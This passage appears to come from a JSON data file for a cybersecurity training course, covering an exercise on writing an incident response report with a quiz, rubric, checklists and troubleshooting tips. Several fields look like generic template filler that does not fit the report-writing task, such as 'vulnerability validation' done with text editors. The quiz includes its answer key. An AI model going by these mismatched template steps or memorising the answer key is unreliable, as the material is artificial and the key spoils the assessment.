        "title": "Execute Core Hands-on Exercise: Incident Reporting, Remediation, & Lessons Learned Root Cause",
        "description": "Using the forensic findings and timeline logs gathered during Class 47, draft a comprehensive Incident Response Report. The document must define the technical timeline, note the initial compromise root cause, audit the data exposure scope, outline the containment steps taken, and supply actionable long-term security recommendations to secure the infrastructure against similar attacks.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Compile Master Incident Report:\n# 1. Executive Summary & Business Impact Statement\n# 2. Comprehensive Attack Timeline (UTC)\n# 3. Root Cause Analysis (CVE, configuration flaw)\n# 4. Containment & Remediation Actions Taken\n# 5. Strategic Hardening Recommendations (Immediate, Short-term, Long-term)",
            "description": "Standard lab command sequence",
            "output": "Completed executive-ready Incident Response Report and Post-Mortem Root Cause Analysis."
          }
        ],
        "verification": "Completed executive-ready Incident Response Report and Post-Mortem Root Cause Analysis.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Documentation workstation",
          "Markdown / Text editors",
          "Completed executive-ready Incident Respo...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the single most important audience distinction when writing an executive incident report?",
        "hint": "Executives need financial risk, business impact, and strategic fixes; technical teams need IOCs and logs."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Incident Reporting, Remediation, & Lessons Learned Root Cause?",
      "options": [
        "Document a major network compromise through a professional technical incident report.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Document a major network compromise through a professional technical incident report."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 48.",
    "eli5Story": {
      "title": "The Chief Detective's Final Report to the King (Executive Incident Report)",
      "analogy": "You write a clear, honest letter to the King: Here is how the thief got in, here is what they touched, here is how we caught them, and here is how to make sure it never happens again!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 48",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Markdown / Text editors",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Documentation workstation"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Markdown / Text editors"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y markdown."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  }
];
